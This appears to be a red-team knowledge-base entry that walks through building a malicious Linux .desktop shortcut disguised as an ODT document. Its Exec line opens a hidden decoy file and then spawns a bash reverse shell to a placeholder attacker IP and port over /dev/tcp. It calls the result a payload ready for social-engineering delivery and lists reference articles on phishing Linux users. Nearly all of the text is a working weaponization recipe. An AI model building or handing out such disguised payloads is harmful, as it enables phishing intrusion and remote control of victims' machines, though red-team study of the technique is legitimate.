---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - linux
credits:
  - tokyoneon
---
# Manual

First create the file.

```
$ touch malicious_document.odt.desktop
```

Then insert the following keys and values.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="document.odt" \
--set-key="Version" --set-value="1.0" \
--set-icon="libreoffice-writer" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="libreoffice --writer \"\$(pwd)/.real_document.odt\"; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_document.odt.desktop 2&>1
```

Run `desktop-file-validate` to check if there are any errors to the `.desktop`. However, you'll see false positives related to the special characters that is inserted.  So it is safe to ignore it. Now the payload is ready to deliver for social engineering.

```
$ desktop-file-validate payload.desktop
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Linux/Helpers|Helpers: Desktop Entries]]

### Null Byte

- [Null Byte: Pop a Reverse Shell with a Video File by Exploiting Popular Linux File Managers](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078)

### DMCXBlue

- [DMCXBlue: Attachments - Desktop Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-desktop-files)

### Vicarius

- [Vicarius: Phishing Linux Users with Zero Detection!](https://www.vicarius.io/vsociety/posts/phishing-linux-users-with-zero-detection)